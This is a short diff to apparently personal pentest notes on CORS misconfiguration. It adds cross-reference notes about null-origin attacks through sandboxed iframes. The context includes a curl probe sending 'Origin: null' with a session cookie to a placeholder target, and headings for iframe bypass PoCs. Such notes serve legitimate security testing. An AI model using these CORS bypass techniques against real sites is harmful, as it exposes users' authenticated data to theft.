@@ -93,6 +93,8 @@ curl -si "https://<target>/api/profile" -H "Origin: null" -b "session=<cookie>" 
 # ACAO: null + ACAC: true → sandbox iframe exploit (see below)
 ```
 
+> [!note] What produces a null origin, which `sandbox` tokens keep it, and the other sinks that trust `null` (CSRF, WebSocket handshake, `postMessage`) are covered in [[Null Origin Attacks]].
+
 ### 4. Regex Bypass — Suffix Match
 
 ```bash
@@ -202,6 +204,8 @@ python3 -m http.server 8080
 ```
 
 ### Null Origin (Sandboxed iframe)
+
+The `sandbox` attribute drops the frame into an opaque origin — omitting `allow-same-origin` is what does it. Token reference and the navigation-based exfil variant in [[Null Origin Attacks#The `sandbox` Attribute]].
 
 ```html
 <!-- null origin bypass — use sandboxed iframe -->
